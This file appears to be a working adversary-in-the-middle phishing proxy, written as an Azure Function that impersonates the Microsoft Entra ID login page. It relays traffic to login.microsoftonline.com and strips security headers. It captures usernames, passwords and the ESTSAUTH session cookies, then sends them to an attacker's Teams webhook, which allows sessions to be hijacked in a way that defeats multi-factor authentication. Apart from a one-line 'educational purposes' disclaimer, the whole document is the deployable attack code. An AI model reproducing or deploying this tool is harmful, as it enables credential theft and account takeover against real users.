/**
 * Azure Function AiTM Phishing PoC for Entra ID accounts.
 * This code is provided for educational purposes only and provided withou any liability or warranty.
 * Based on: https://github.com/zolderio/AITMWorker
 */

const { app } = require("@azure/functions");

const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

async function replace_response_text(response, upstream, original) {
  return response
    .text()
    .then((text) => text.replace(new RegExp(upstream, "g"), original));
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        await fetch(teams_webhook_url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ text: message }),
        })
          .then((response) =>
            response.ok
              ? console.log("successfully dispatched MSG")
              : console.error(`Failed to dispatch: ${response.statusText}`)
          )
          .catch((error) => console.log(error));
      }
    }

    // original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Rewriting to MSONLINE
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname == "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_path + upstream_url.pathname;
    }

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url}`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );

    // Obtain password from POST body
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split("&");

      // extract key-value pairs for username and password
      const msg = Object.fromEntries(
        keyValuePairs
          .map((pair) => ([key, value] = pair.split("=")))
          .filter(([key, _]) => key == "login" || key == "passwd")
          .map(([_, value]) => [
            _,
            decodeURIComponent(value.replace(/\+/g, " ")),
          ])
      );

      if (msg.login && msg.passwd) {
        dispatchMessage(
          "Captured login information: <br>" + JSON.stringify(msg)
        );
      }
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.body,
      duplex: "half",
    });

    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() == "websocket"
    ) {
      return original_response;
    }

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      // getSetCookie is the successor of Headers.getAll
      const originalCookies = original_response.headers.getSetCookie();

      originalCookies.forEach((originalCookie) => {
        const modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      const cookies = originalCookies.filter(
        (cookie) =>
          cookie.startsWith("ESTSAUTH=") ||
          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
          cookie.startsWith("SignInStateCookie=")
      );

      if (cookies.length == 3) {
        dispatchMessage(
          "Captured required authentication cookies: <br>" +
            JSON.stringify(cookies)
        );
      }
    } catch (error) {
      console.error(error);
    }

    const original_text = await replace_response_text(
      original_response.clone(),
      upstream_url.protocol + "//" + upstream_url.host,
      original_url.protocol + "//" + original_url.host
    );

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
